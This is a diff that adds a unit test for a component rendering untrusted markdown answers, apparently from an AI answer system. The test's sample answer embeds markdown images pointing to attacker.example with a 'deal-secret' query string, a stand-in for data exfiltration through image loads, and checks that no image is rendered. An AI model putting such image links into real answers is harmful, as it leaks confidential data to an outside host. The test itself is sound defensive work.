@@ -43,6 +43,16 @@ describe("AnswerPanel rendering of untrusted markdown", () => {
     expect(screen.getByText("Open the data room").closest("a")).toBeNull();
   });
 
+  it("never loads an image the answer embeds, showing its alt text instead", () => {
+    const answer =
+      "Revenue was $452.8M. ![EBITDA chart](https://attacker.example/x.png?q=deal-secret) " +
+      "![](https://attacker.example/y.png)";
+    const { container } = render(<AnswerPanel result={response({ answer })} />);
+    expect(container.querySelector("img")).toBeNull();
+    expect(container.innerHTML).not.toContain("attacker.example");
+    expect(screen.getByText("EBITDA chart")).toBeInTheDocument();
+  });
+
   it("renders the draft and the error-free answer as text nodes", () => {
     render(<AnswerPanel result={null} draft={"<b>bold?</b> Revenue"} />);
     expect(document.querySelector("b")).toBeNull();
